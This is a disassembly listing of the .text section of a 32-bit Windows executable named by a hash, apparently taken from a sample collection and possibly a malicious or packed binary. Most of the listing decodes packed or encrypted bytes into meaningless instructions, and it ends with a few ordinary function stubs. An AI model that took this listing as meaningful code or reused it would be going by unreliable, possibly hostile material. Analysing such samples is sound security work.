
dc32dbfa9c7f0824b6a271538366942f3a3683dd4d16d453784e9610aefd1734.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	popa   
  4d0001:	add    eax,0x126ab3fb
  4d0006:	sbb    eax,0x258b4650
  4d000b:	out    0x3c,al
  4d000d:	es sti 
  4d000f:	inc    esi
  4d0010:	fsubr  QWORD PTR [ebx+0x640cc124]
  4d0016:	enter  0x4511,0xf4
  4d001a:	(bad)  
  4d001b:	jle    0x4d0004
  4d001d:	aam    0xbb
  4d001f:	inc    edx
  4d0020:	sbb    eax,0xe19fa280
  4d0025:	add    esp,DWORD PTR [edx]
  4d0027:	push   ebp
  4d0028:	or     BYTE PTR [edx],cl
  4d002a:	fisubr WORD PTR [edx+0x665c75f9]
  4d0030:	icebp  
  4d0031:	out    dx,eax
  4d0032:	bswap  ebp
  4d0034:	inc    edx
  4d0035:	ds push esp
  4d0037:	lahf   
  4d0038:	sub    eax,edx
  4d003a:	add    esi,DWORD PTR [ecx+0x79c73e57]
  4d0040:	or     eax,DWORD PTR [edi+0x38]
  4d0043:	pop    ebp
  4d0044:	adc    DWORD PTR [ecx-0x10431a35],0x90456aac
  4d004e:	push   edi
  4d004f:	xchg   ebp,eax
  4d0050:	xor    bl,BYTE PTR [ebx+0x64d45d90]
  4d0056:	outs   dx,DWORD PTR ds:[esi]
  4d0057:	(bad)  
  4d0058:	mov    eax,0x49114a90
  4d005d:	outs   dx,DWORD PTR ds:[esi]
  4d005e:	mov    ch,0x9b
  4d0060:	mov    al,ds:0x61644d83
  4d0065:	add    eax,0xf08297f9
  4d006a:	jno    0x4d0037
  4d006c:	out    0x50,eax
  4d006e:	cli    
  4d006f:	mov    al,ds:0xc44e1789
  4d0074:	fstp   DWORD PTR [eax+0x6]
  4d0077:	(bad)  
  4d0078:	daa    
  4d0079:	std    
  4d007a:	add    edx,edi
  4d007c:	loopne 0x4d00ea
  4d007e:	(bad)  
  4d007f:	ins    DWORD PTR es:[edi],dx
  4d0080:	addr16 add eax,0x4302f767
  4d0086:	(bad)  
  4d0087:	imul   ebp,DWORD PTR [edi+0x11],0xf6e79555
  4d008e:	xor    esi,DWORD PTR [ecx+0x67908c1e]
  4d0094:	dec    ebp
  4d0095:	mov    ah,0xd7
  4d0097:	cwde   
  4d0098:	les    ecx,FWORD PTR [ebx+0x28]
  4d009b:	iret   
  4d009c:	loope  0x4d0058
  4d009e:	xlat   BYTE PTR ds:[ebx]
  4d009f:	xor    BYTE PTR [edx-0x78dad8bb],cl
  4d00a5:	inc    ebp
  4d00a6:	shl    eax,1
  4d00a8:	sbb    DWORD PTR [ebx-0x2dc7e0d2],edi
  4d00ae:	xchg   BYTE PTR [ecx+0x8792dc2],dh
  4d00b4:	jecxz  0x4d008e
  4d00b6:	xchg   bh,dh
  4d00b8:	adc    esp,ecx
  4d00ba:	cmp    al,0xf1
  4d00bc:	jns    0x4d00f7
  4d00be:	ret    
  4d00bf:	push   cs
  4d00c0:	in     eax,0x24
  4d00c2:	les    esp,FWORD PTR ds:0xd4243140
  4d00c8:	(bad)
  4d00cb:	adc    esi,DWORD PTR [ebx+0x36]
  4d00ce:	and    al,0xec
  4d00d0:	sbb    edx,eax
  4d00d2:	inc    esi
  4d00d3:	adc    al,0x52
  4d00d5:	ds mov eax,0x47191361
  4d00db:	hlt    
  4d00dc:	push   ss
  4d00dd:	jb     0x4d00e5
  4d00df:	je     0x4d0136
  4d00e1:	mov    cs,WORD PTR [ebp-0x1c]
  4d00e4:	stos   DWORD PTR es:[edi],eax
  4d00e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d00e6:	(bad)  
  4d00e7:	imul   esp,DWORD PTR [edi-0x506c7f51],0x7c
  4d00ee:	xlat   BYTE PTR ds:[ebx]
  4d00ef:	ret    
  4d00f0:	push   ecx
  4d00f1:	fld    DWORD PTR [eax+0x24]
  4d00f4:	fldcw  WORD PTR [ecx]
  4d00f6:	mov    edi,0x7d1cb3db
  4d00fb:	mov    cl,0x52
  4d00fd:	jmp    0x2d3c46ea
  4d0102:	pop    ss
  4d0103:	fiadd  DWORD PTR [edi-0x5181de17]
  4d0109:	mov    ch,bh
  4d010b:	or     al,0xab
  4d010d:	test   eax,0x56bef77a
  4d0112:	mov    ch,0x8
  4d0114:	inc    ebx
  4d0115:	test   al,0xbb
  4d0117:	inc    edi
  4d0118:	adc    DWORD PTR [edi-0x66],edx
  4d011b:	enter  0x267b,0xd2
  4d011f:	xchg   edx,ebx
  4d0121:	inc    ebx
  4d0122:	xor    cl,bh
  4d0124:	jp     0x4d00e1
  4d0126:	and    edi,DWORD PTR ds:0x19deaedb
  4d012c:	jns    0x4d00d5
  4d012e:	lods   al,BYTE PTR ds:[esi]
  4d012f:	mov    ch,0x13
  4d0131:	push   esp
  4d0132:	inc    edi
  4d0133:	out    dx,eax
  4d0134:	dec    esp
  4d0135:	stos   DWORD PTR es:[edi],eax
  4d0136:	push   cs
  4d0137:	sbb    eax,0xe6bfe00d
  4d013c:	cmp    eax,0xdc92cd5c
  4d0141:	mov    cl,BYTE PTR cs:[ebp-0x794877cc]
  4d0148:	shr    BYTE PTR [edi+0x58],1
  4d014b:	xor    BYTE PTR [edx-0x6a],bh
  4d014e:	pop    es
  4d014f:	pop    ebx
  4d0150:	into   
  4d0151:	jge    0x4d01d0
  4d0153:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4d0155:	ret    
  4d0156:	or     eax,0xb2c162e2
  4d015b:	xchg   edx,eax
  4d015c:	fldenv [esi]
  4d015e:	fbstp  TBYTE PTR [ecx+0x28]
  4d0161:	fldcw  WORD PTR [ebx+0x786e6456]
  4d0167:	xchg   ecx,eax
  4d0168:	adc    dl,BYTE PTR [edi+eax*4-0x731d0d92]
  4d016f:	nop
  4d0170:	xchg   BYTE PTR ds:0xd587eefe,ch
  4d0176:	cld    
  4d0177:	ins    BYTE PTR es:[edi],dx
  4d0178:	retf   0xd7b5
  4d017b:	in     eax,0x87
  4d017d:	fwait
  4d017e:	jg     0x4d01eb
  4d0180:	int3   
  4d0181:	into   
  4d0182:	test   ch,ah
  4d0184:	mov    WORD PTR [eax],?
  4d0186:	shl    DWORD PTR [esi],1
  4d0188:	into   
  4d0189:	add    ch,bh
  4d018b:	xor    BYTE PTR [esi],ah
  4d018d:	test   al,0x70
  4d018f:	pop    edx
  4d0190:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0191:	dec    ebx
  4d0192:	xor    al,0xa5
  4d0194:	mov    al,0xc0
  4d0196:	and    edi,DWORD PTR [esp+edx*8-0x21d9fafa]
  4d019d:	loope  0x4d01a5
  4d019f:	(bad)  [ebx]
  4d01a1:	push   ds
  4d01a2:	loope  0x4d014a
  4d01a4:	fsubrp st(1),st
  4d01a6:	push   ds
  4d01a7:	mov    cl,0x8b
  4d01a9:	push   ds
  4d01aa:	and    DWORD PTR [edi+0x76],ecx
  4d01ad:	loopne 0x4d0203
  4d01af:	sbb    ecx,esp
  4d01b1:	stos   BYTE PTR es:[edi],al
  4d01b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d01b3:	jb     0x4d01c5
  4d01b5:	ds fs xchg ecx,eax
  4d01b8:	icebp  
  4d01b9:	sar    edi,0x6d
  4d01bc:	inc    ebp
  4d01bd:	outs   dx,BYTE PTR ds:[esi]
  4d01be:	add    BYTE PTR [edx-0x51751644],dl
  4d01c4:	push   ecx
  4d01c5:	mov    eax,ds:0xb6e95db5
  4d01ca:	bound  edx,QWORD PTR [esi]
  4d01cc:	sbb    al,0xd4
  4d01ce:	popf   
  4d01cf:	aam    0xdc
  4d01d1:	mov    bh,0x6e
  4d01d3:	dec    edi
  4d01d4:	sub    BYTE PTR [ecx-0x68b5c433],dl
  4d01da:	xor    eax,0xe2e140bb
  4d01df:	int    0x31
  4d01e1:	cmp    eax,DWORD PTR [ebx+0x7cdb1129]
  4d01e7:	mul    BYTE PTR [ebp+0x31]
  4d01ea:	out    0xaa,eax
  4d01ec:	mov    ah,0xce
  4d01ee:	sbb    BYTE PTR [ebp-0x28],dl
  4d01f1:	jno    0x4d020a
  4d01f3:	xor    al,0xa1
  4d01f5:	xchg   esi,eax
  4d01f6:	out    0x21,eax
  4d01f8:	je     0x4d024b
  4d01fa:	(bad)  
  4d01fb:	loopne 0x4d018a
  4d01fd:	scas   al,BYTE PTR es:[edi]
  4d01fe:	int    0xe8
  4d0200:	int3   
  4d0201:	fisub  DWORD PTR [esi-0x5679aec5]
  4d0207:	lods   al,BYTE PTR ds:[esi]
  4d0208:	in     eax,dx
  4d0209:	jge    0x4d0261
  4d020b:	push   ebx
  4d020c:	ins    BYTE PTR es:[edi],dx
  4d020d:	add    esp,DWORD PTR [edx]
  4d020f:	add    eax,0xfaddfe95
  4d0214:	loope  0x4d0226
  4d0216:	lods   eax,DWORD PTR ds:[esi]
  4d0217:	or     DWORD PTR [esi+esi*4+0x57],eax
  4d021b:	sbb    bh,BYTE PTR [ebp+0x43e5a849]
  4d0221:	sub    edi,DWORD PTR [esi+ebx*1+0xe]
  4d0225:	or     BYTE PTR [ebp+eiz*4+0x53],al
  4d0229:	sub    DWORD PTR [edi-0x2446dba2],0x57
  4d0230:	pop    ebp
  4d0231:	inc    edi
  4d0232:	and    al,0xa8
  4d0234:	sub    DWORD PTR [edi+0x43dbcb50],ebp
  4d023a:	cmp    esi,DWORD PTR [ebx-0x3e3bbece]
  4d0240:	cmp    edx,eax
  4d0242:	ss xchg esi,eax
  4d0244:	(bad)  
  4d0245:	xchg   ebx,eax
  4d0246:	int    0xee
  4d0248:	cli    
  4d0249:	loope  0x4d0281
  4d024b:	push   0xe7c97406
  4d0250:	push   ecx
  4d0251:	pop    ss
  4d0252:	lods   eax,DWORD PTR ds:[esi]
  4d0253:	sub    BYTE PTR [ebx-0x42a2125],dh
  4d0259:	test   eax,0x82019fe1
  4d025e:	adc    eax,0x3bdcceec
  4d0263:	xchg   DWORD PTR fs:[ebp+0x71d1ecc8],ecx
  4d026a:	lea    ebx,[edi]
  4d026c:	xchg   BYTE PTR [ecx],bl
  4d026e:	jns    0x4d02d5
  4d0270:	cmp    esi,DWORD PTR [edi+0x17]
  4d0273:	es or  al,0x99
  4d0276:	jne    0x4d0286
  4d0278:	clc    
  4d0279:	mov    ebp,0xb6c97737
  4d027e:	jecxz  0x4d02b1
  4d0280:	cmp    BYTE PTR [ecx+0x1c],cl
  4d0283:	dec    esi
  4d0284:	ds mov ebx,0x46c6f670
  4d028a:	mov    ah,0x8
  4d028c:	cmp    bh,BYTE PTR [ecx-0x4439b835]
  4d0292:	pop    eax
  4d0293:	int3   
  4d0294:	cmp    bl,BYTE PTR [edx+0x46b2deaf]
  4d029a:	mov    al,0x7f
  4d029c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d029d:	adc    ah,BYTE PTR [eax+edx*8-0x7aa4bb55]
  4d02a4:	bound  edx,QWORD PTR [ebx]
  4d02a6:	sub    BYTE PTR [ecx-0x4d],al
  4d02a9:	xlat   BYTE PTR ds:[ebx]
  4d02aa:	and    BYTE PTR [bx+di],dl
  4d02ad:	mov    DWORD PTR [ebx],esp
  4d02af:	mov    bl,0x7b
  4d02b1:	imul   esp,eax,0x75c1c2c2
  4d02b7:	jno    0x4d027d
  4d02b9:	adc    BYTE PTR [edx+0x65efd212],bl
  4d02bf:	in     eax,dx
  4d02c0:	mov    edx,0x47133e9e
  4d02c5:	popa   
  4d02c6:	dec    esp
  4d02c7:	mov    ds:0x5cb39f5a,eax
  4d02cc:	sub    al,0x57
  4d02ce:	pop    esp
  4d02cf:	daa    
  4d02d0:	push   esi
  4d02d1:	test   eax,0x49aed8a3
  4d02d6:	or     dh,BYTE PTR [ebx-0x620f45b5]
  4d02dc:	inc    ecx
  4d02dd:	or     ah,BYTE PTR [eax-0x4d]
  4d02e0:	adc    al,BYTE PTR [esi+0xa]
  4d02e3:	push   ecx
  4d02e4:	push   edi
  4d02e5:	mov    edx,0x9caaaf05
  4d02ea:	jge    0x4d0325
  4d02ec:	pop    ebx
  4d02ed:	mov    bl,0xec
  4d02ef:	retf   0x4d0e
  4d02f2:	and    esi,DWORD PTR ds:0xcf5e09f3
  4d02f8:	xor    dh,dh
  4d02fa:	mov    cl,0x30
  4d02fc:	iret   
  4d02fd:	or     BYTE PTR [ebx+ebx*8+0x7e684d31],ah
  4d0304:	sub    DWORD PTR [eax-0x3d],esp
  4d0307:	dec    ecx
  4d0308:	sub    DWORD PTR [ebx],ebp
  4d030a:	add    eax,0xe458c188
  4d030f:	jl     0x4d0384
  4d0311:	xor    BYTE PTR [bx+si],0xf4
  4d0315:	inc    ecx
  4d0316:	jle    0x4d0317
  4d0318:	add    esi,0x398fffa6
  4d031e:	pop    ecx
  4d031f:	add    DWORD PTR [esi-0x2b127733],eax
  4d0325:	mov    edi,0x913136bb
  4d032a:	xchg   esi,eax
  4d032b:	sbb    edi,ecx
  4d032d:	lahf   
  4d032e:	shl    esi,1
  4d0330:	inc    edx
  4d0331:	pusha  
  4d0332:	cs jo  0x4d0377
  4d0335:	mov    dh,dl
  4d0337:	fistp  QWORD PTR [esi+0x532091a8]
  4d033d:	push   edi
  4d033e:	outs   dx,BYTE PTR ds:[esi]
  4d033f:	ss das 
  4d0341:	lods   eax,DWORD PTR ds:[esi]
  4d0342:	mov    ch,0xc9
  4d0344:	loop   0x4d0398
  4d0346:	dec    edx
  4d0347:	xor    eax,0x20b4b974
  4d034c:	cdq    
  4d034d:	mov    al,ds:0xe4c037a4
  4d0352:	and    al,0x3e
  4d0354:	ret    0x9e7c
  4d0357:	and    ch,BYTE PTR [edx]
  4d0359:	mov    ecx,DWORD PTR [esi]
  4d035b:	rcl    ah,0x2
  4d035e:	es inc ebx
  4d0360:	lock mov dl,al
  4d0363:	dec    eax
  4d0364:	add    al,0x31
  4d0366:	dec    esi
  4d0367:	mov    bh,0xfd
  4d0369:	into   
  4d036a:	cdq    
  4d036b:	xor    al,0x3
  4d036d:	xor    DWORD PTR [esi-0x7b],esp
  4d0370:	sbb    eax,0xcc7a99cf
  4d0375:	adc    ah,BYTE PTR [esi-0x7b]
  4d0378:	xor    al,0x44
  4d037a:	push   ebx
  4d037b:	or     ch,0xbb
  4d037e:	lods   al,BYTE PTR ds:[esi]
  4d037f:	or     al,BYTE PTR gs:[ebx+edx*2-0x66]
  4d0384:	or     BYTE PTR [eax+edi*1-0x2ed35c66],0x65
  4d038c:	pop    esi
  4d038d:	rcl    DWORD PTR [esi],cl
  4d038f:	bound  esp,QWORD PTR [edx+0x5d29e92c]
  4d0395:	pop    edi
  4d0396:	loope  0x4d0356
  4d0398:	bound  esp,QWORD PTR [eax+0x1fd2411e]
  4d039e:	xor    al,BYTE PTR [eax-0x7b711809]
  4d03a4:	cs and eax,0x86f77f72
  4d03aa:	adc    al,BYTE PTR [ecx+0x7f]
  4d03ad:	push   0x46
  4d03af:	dec    edx
  4d03b0:	jns    0x4d0383
  4d03b2:	jle    0x4d03de
  4d03b4:	mov    edi,DWORD PTR [eax-0xa]
  4d03b7:	mov    dl,0x1
  4d03b9:	mov    esp,0x440a062d
  4d03be:	sar    cl,cl
  4d03c0:	fist   WORD PTR [ecx+0x2d]
  4d03c3:	push   es
  4d03c4:	and    DWORD PTR [esi-0x5fc9f977],edi
  4d03ca:	(bad)  
  4d03cb:	mov    dl,0xd3
  4d03cd:	pop    edi
  4d03ce:	cmp    BYTE PTR [ebp+0x16],cl
  4d03d1:	es (bad) 
  4d03d3:	mov    dl,0xea
  4d03d5:	xor    esp,DWORD PTR [ecx]
  4d03d7:	int    0x16
  4d03d9:	int3   
  4d03da:	fidivr WORD PTR [edi+ebx*2+0x65a43d58]
  4d03e1:	stc    
  4d03e2:	add    DWORD PTR [ecx+edi*4-0x41],0xffffff9c
  4d03e7:	mov    ebx,0xb8ab4048
  4d03ec:	jmp    0x18945b69
  4d03f1:	xchg   eax,esi
  4d03f3:	sub    al,0x11
  4d03f5:	xor    dh,BYTE PTR [eax]
  4d03f7:	shl    eax,cl
  4d03f9:	int    0x17
  4d03fb:	mov    eax,ds:0x5eeceb31
  4d0400:	rcl    BYTE PTR [ebx+ebx*2],1
  4d0403:	adc    eax,0xeae5a449
  4d0408:	mov    eax,0x5989625b
  4d040d:	pop    ebp
  4d040e:	mov    ds:0xa5a2a876,al
  4d0413:	std    
  4d0414:	popa   
  4d0415:	push   ss
  4d0416:	fwait
  4d0417:	add    ah,BYTE PTR [eax+0x6171ace9]
  4d041d:	mov    eax,ds:0xbf63e814
  4d0422:	jbe    0x4d0491
  4d0424:	push   cs
  4d0425:	ret    0x247b
  4d0428:	fld    QWORD PTR [ebx-0x1b8e9904]
  4d042e:	mov    ss,WORD PTR [edi+0x68c99913]
  4d0434:	bound  ebp,QWORD PTR [edx+0x37]
  4d0437:	or     al,0xf7
  4d0439:	and    BYTE PTR [esi],cl
  4d043b:	push   esp
  4d043c:	(bad)  
  4d043d:	lahf   
  4d043e:	sar    bx,0xa6
  4d0442:	aad    0x90
  4d0444:	rcr    BYTE PTR [ebp+0x2a],0x6f
  4d0448:	inc    ecx
  4d0449:	mov    bh,BYTE PTR [ebx-0x6e]
  4d044c:	shl    BYTE PTR [ebp-0x22],0x70
  4d0450:	xor    DWORD PTR [esi-0x526744e7],ecx
  4d0456:	pop    ebx
  4d0457:	popf   
  4d0458:	ficomp WORD PTR [edi-0x59]
  4d045b:	xlat   BYTE PTR ds:[ebx]
  4d045c:	jg     0x4d0401
  4d045e:	aad    0x84
  4d0460:	lods   eax,DWORD PTR ds:[esi]
  4d0461:	test   eax,0xcb1d0086
  4d0466:	test   BYTE PTR [esp+esi*1+0x78ae3d68],ch
  4d046d:	sbb    ebp,DWORD PTR [ebp+edx*2+0x6db5c86b]
  4d0474:	idiv   BYTE PTR [edx-0x46f42139]
  4d047a:	dec    edx
  4d047b:	or     DWORD PTR ds:0x87f6b547,eax
  4d0481:	ss lahf 
  4d0483:	mov    ?,WORD PTR [ecx+0x3e]
  4d0486:	addr16 sbb al,0x70
  4d0489:	gs cdq 
  4d048b:	jecxz  0x4d041e
  4d048d:	sti    
  4d048e:	sub    DWORD PTR [ebp+0x6f],edi
  4d0491:	pop    edx
  4d0492:	adc    cl,BYTE PTR [esi]
  4d0494:	push   0x31
  4d0496:	arpl   WORD PTR [esi],di
  4d0498:	and    dl,BYTE PTR [ebp*8+0x13542f11]
  4d049f:	out    dx,al
  4d04a0:	fisubr WORD PTR [ebx-0x6b87eec1]
  4d04a6:	sbb    DWORD PTR [edi],edi
  4d04a8:	adc    al,0x64
  4d04aa:	fisub  DWORD PTR [ebp-0x2b]
  4d04ad:	aam    0x25
  4d04af:	call   0xacf9:0xaa63732c
  4d04b6:	daa    
  4d04b7:	dec    esi
  4d04b8:	xchg   ebp,eax
  4d04b9:	pop    edi
  4d04ba:	xchg   ebp,eax
  4d04bb:	mov    dh,0x6c
  4d04bd:	mov    al,ds:0x7836ad6a
  4d04c2:	xchg   ebp,eax
  4d04c3:	push   edx
  4d04c4:	retf   
  4d04c5:	adc    bl,bl
  4d04c7:	fld    DWORD PTR [edi-0x79d9daab]
  4d04cd:	stos   BYTE PTR es:[edi],al
  4d04ce:	sub    eax,0x5f95d0d9
  4d04d3:	xor    ebp,ecx
  4d04d5:	stc    
  4d04d6:	mov    eax,ds:0xe9d5a31c
  4d04db:	fist   DWORD PTR [ecx-0x30]
  4d04de:	jp     0x4d04a5
  4d04e0:	enter  0x852f,0x3a
  4d04e4:	enter  0xa710,0x26
  4d04e8:	cld    
  4d04e9:	dec    edi
  4d04ea:	fcmovb st,st(5)
  4d04ec:	and    eax,0x443a25b2
  4d04f1:	jb     0x4d04cf
  4d04f3:	lds    edi,FWORD PTR [ebp+0x44a519c0]
  4d04f9:	test   eax,0x731259ee
  4d04fe:	pushf  
  4d04ff:	jle    0x4d0544
  4d0501:	loopne 0x4d0565
  4d0503:	xlat   BYTE PTR ds:[ebx]
  4d0504:	repnz stos BYTE PTR es:[edi],al
  4d0506:	loope  0x4d0554
  4d0508:	sub    ebx,DWORD PTR [eax+0x5e]
  4d050b:	out    dx,eax
  4d050c:	popa   
  4d050d:	sub    BYTE PTR [edx+0x11],ah
  4d0510:	mov    al,ds:0xd5af22d7
  4d0515:	sub    DWORD PTR [ebx],esp
  4d0517:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0518:	jg     0x4d04ef
  4d051a:	xor    dl,BYTE PTR [ebx+0x5242eb07]
  4d0520:	dec    ebp
  4d0521:	adc    al,0x13
  4d0523:	(bad)  
  4d0524:	xor    eax,0xcc3c11b0
  4d0529:	dec    edi
  4d052a:	ja     0x4d0564
  4d052c:	pop    ecx
  4d052d:	int3   
  4d052e:	jmp    0x82e90dbd
  4d0533:	loope  0x4d052e
  4d0535:	arpl   bp,sp
  4d0537:	nop
  4d0538:	jl     0x4d0504
  4d053a:	jle    0x4d0513
  4d053c:	repnz test al,0xf7
  4d053f:	mov    esp,DWORD PTR [ebx+0x56]
  4d0542:	pop    esi
  4d0543:	js     0x4d0568
  4d0545:	push   0x17
  4d0547:	nop
  4d0548:	xor    dl,BYTE PTR [ebp+0x2b54703e]
  4d054e:	fst    QWORD PTR ss:[edi]
  4d0551:	aad    0x31
  4d0553:	mov    WORD PTR [eax-0x61],ds
  4d0556:	xor    al,0xdc
  4d0558:	psubusb mm7,QWORD PTR [ebx]
  4d055b:	xchg   esi,eax
  4d055c:	inc    esi
  4d055d:	js     0x4d0522
  4d055f:	mov    edi,0x4d010ac3
  4d0564:	leave  
  4d0565:	in     eax,0x4f
  4d0567:	pop    es
  4d0568:	mov    ds:0xb5001a5a,al
  4d056d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d056e:	cmp    ecx,DWORD PTR [esp+eiz*4]
  4d0571:	stos   DWORD PTR es:[edi],eax
  4d0572:	sbb    BYTE PTR [edi+eax*8+0x5b],al
  4d0576:	cmp    eax,0xc2a460a4
  4d057b:	pop    ebx
  4d057c:	sub    al,0x98
  4d057e:	popa   
  4d057f:	and    eax,0xda9e7a9c
  4d0584:	gs out dx,eax
  4d0586:	push   0xdeb58f7e
  4d058b:	or     al,0x38
  4d058d:	imul   BYTE PTR [esi-0x46453d8f]
  4d0593:	cmp    BYTE PTR [edi+0x148af6f0],dl
  4d0599:	maxps  xmm0,XMMWORD PTR [ecx-0x749a8bbb]
  4d05a0:	sbb    eax,0xb473f34f
  4d05a5:	push   es
  4d05a6:	cmc    
  4d05a7:	sub    cl,BYTE PTR [ebp-0x7]
  4d05aa:	or     dh,BYTE PTR [edx]
  4d05ac:	inc    ecx
  4d05ad:	dec    esp
  4d05ae:	gs push ecx
  4d05b0:	cmp    BYTE PTR [eax+0x57a5f323],0x39
  4d05b7:	or     eax,0xf2c6a85c
  4d05bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d05bd:	push   edi
  4d05be:	mov    eax,ds:0x5ea85c0d
  4d05c3:	mov    ch,0xb
  4d05c5:	mov    edx,DWORD PTR [edi-0x3d3d4f4f]
  4d05cb:	mov    ah,0xfe
  4d05cd:	mov    ds:0x64771b70,eax
  4d05d2:	adc    bl,dl
  4d05d4:	mov    WORD PTR [ebx+0x42602cef],gs
  4d05da:	sahf   
  4d05db:	xor    DWORD PTR [edi+0x53446142],ebx
  4d05e1:	dec    ecx
  4d05e2:	adc    eax,0x3b7114f6
  4d05e7:	dec    edi
  4d05e8:	jp     0x4d05ad
  4d05ea:	loop   0x4d0602
  4d05ec:	xor    al,0xa3
  4d05ee:	push   eax
  4d05ef:	mov    ecx,0x98733d42
  4d05f4:	repnz mov ecx,esi
  4d05f7:	xchg   edx,eax
  4d05f8:	shr    esp,1
  4d05fa:	xor    eax,0xc1fe32e1
  4d05ff:	push   edx
  4d0600:	pop    DWORD PTR ds:0x546e9000
  4d0606:	ret    
  4d0607:	sti    
  4d0608:	adc    BYTE PTR [edi+eiz*4],dl
  4d060b:	or     BYTE PTR [ecx-0x14],bl
  4d060e:	push   0x16aa8f7
  4d0613:	or     DWORD PTR [eax-0x15],ebx
  4d0616:	push   cs
  4d0617:	sbb    BYTE PTR [ecx+0x6982dd96],0x69
  4d061e:	and    cl,BYTE PTR [eax]
  4d0620:	xchg   esp,eax
  4d0621:	jmp    ecx
  4d0623:	clc    
  4d0624:	ins    DWORD PTR es:[edi],dx
  4d0625:	add    BYTE PTR [ebp+0x5a],dh
  4d0628:	xchg   ebx,eax
  4d0629:	push   ebp
  4d062a:	stos   DWORD PTR es:[edi],eax
  4d062b:	movd   mm2,DWORD PTR [edx]
  4d062e:	aad    0xf0
  4d0630:	xchg   ebx,eax
  4d0631:	in     eax,dx
  4d0632:	xchg   esp,eax
  4d0633:	adc    bl,al
  4d0635:	adc    dl,ch
  4d0637:	out    dx,al
  4d0638:	xchg   ecx,eax
  4d0639:	in     eax,dx
  4d063a:	sub    dl,BYTE PTR [ecx]
  4d063c:	lock imul edx,esp,0xf0173544
  4d0643:	mov    edi,0x30fe8cd
  4d0648:	les    ebp,FWORD PTR [edi-0x11]
  4d064b:	int    0x38
  4d064d:	gs mov bl,0x93
  4d0650:	push   ebx
  4d0651:	xlat   BYTE PTR ds:[ebx]
  4d0652:	push   eax
  4d0653:	mov    ecx,0x135ee0fb
  4d0658:	jecxz  0x4d06b4
  4d065a:	cmp    dh,BYTE PTR [ebx+0x3e]
  4d065d:	xor    DWORD PTR [esi],ecx
  4d065f:	out    dx,eax
  4d0660:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d0661:	inc    ecx
  4d0662:	retf   
  4d0663:	sub    al,0x3d
  4d0665:	jnp    0x4d067a
  4d0667:	inc    eax
  4d0668:	pop    edi
  4d0669:	xor    ecx,DWORD PTR [ecx-0x400f9d6c]
  4d066f:	pop    es
  4d0670:	ja     0x4d06ef
  4d0672:	in     eax,dx
  4d0673:	js     0xbfc2c3c5
  4d0679:	pop    ds
  4d067a:	fnsave [ebx-0xcd19cb6]
  4d0680:	jo     0x4d0605
  4d0682:	call   0x18e5d794
  4d0687:	jge    0x4d0674
  4d0689:	scas   eax,DWORD PTR es:[edi]
  4d068a:	leave  
  4d068b:	dec    edx
  4d068c:	mov    ds:0x60db930f,eax
  4d0691:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d0699:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d06a1:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d06a9:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d06b1:	in     al,0xac
  4d06b3:	(bad)  [ecx+0x60245873]
  4d06b9:	nop
  4d06ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d06bb:	(bad)  [ebp-0x72]
  4d06be:	fisubr DWORD PTR [edx]
  4d06c0:	pop    esi
  4d06c1:	adc    DWORD PTR [ecx],esi
  4d06c3:	sbb    al,0x4e
  4d06c5:	aad    0x68
  4d06c7:	pop    ds
  4d06c8:	popa   
  4d06c9:	(bad)  
  4d06ca:	int3   
  4d06cb:	inc    eax
  4d06cc:	inc    edi
  4d06cd:	je     0x4d066e
  4d06cf:	sub    edx,DWORD PTR [ebp+0xd]
  4d06d2:	add    dh,BYTE PTR [ecx]
  4d06d4:	loope  0x4d0709
  4d06d6:	imul   BYTE PTR [esi-0x7b]
  4d06d9:	add    ah,BYTE PTR [edx]
  4d06db:	ficomp DWORD PTR [ebx+0x6c]
  4d06de:	dec    ebx
  4d06df:	mov    ds:0x32c306cf,eax
  4d06e4:	in     eax,dx
  4d06e5:	adc    eax,0x6ae548c0
  4d06ea:	jge    0x4d0696
  4d06ec:	mov    edi,edi
  4d06ee:	push   ebp
  4d06ef:	mov    ebp,esp
  4d06f1:	sub    esp,0x44
  4d06f4:	mov    ecx,0x4d31b4
  4d06f9:	mov    eax,edx
  4d06fb:	push   ecx
  4d06fc:	mov    esi,0x0
  4d0701:	push   esi
  4d0702:	call   0x4d0e80
  4d0707:	add    esp,0x4
  4d070a:	pop    ecx
  4d070b:	push   ecx
  4d070c:	push   DWORD PTR [ecx+0x58]
  4d070f:	push   DWORD PTR [ecx+0xe8]
  4d0715:	call   0x4d0a68
  4d071a:	add    esp,0x8
  4d071d:	pop    ecx
  4d071e:	push   ecx
  4d071f:	mov    edx,0x0
  4d0724:	push   edx
  4d0725:	call   0x4d0de4
  4d072a:	add    esp,0x4
  4d072d:	pop    ecx
  4d072e:	add    esp,0x44
  4d0731:	pop    ebp
  4d0732:	ret    
  4d0733:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0739:	sub    esp,0x24
  4d073c:	lea    ebx,[edx+0x70]
  4d073f:	adc    DWORD PTR [ebp-0x8],edx
  4d0742:	push   0x0
  4d0744:	call   0x4d0e8c
  4d0749:	add    esp,0x4
  4d074c:	push   ebx
  4d074d:	push   edx
  4d074e:	push   DWORD PTR [ebx+0x4c]
  4d0751:	push   edi
  4d0752:	call   0x4d06ec
  4d0757:	add    esp,0xc
  4d075a:	pop    ebx
  4d075b:	push   0x0
  4d075d:	call   0x4d0dd8
  4d0762:	add    esp,0x4
  4d0765:	add    esp,0x24
  4d0768:	pop    ebp
  4d0769:	ret    
  4d076a:	add    BYTE PTR [eax],al
  4d076c:	mov    edi,edi
  4d076e:	push   ebp
  4d076f:	mov    ebp,esp
  4d0771:	sub    esp,0x38
  4d0774:	mov    esi,0x4d3028
  4d0779:	xor    DWORD PTR [ebp-0x34],ebx
  4d077c:	push   esi
  4d077d:	push   edi
  4d077e:	push   ecx
  4d077f:	call   0x4d0c64
  4d0784:	add    esp,0x8
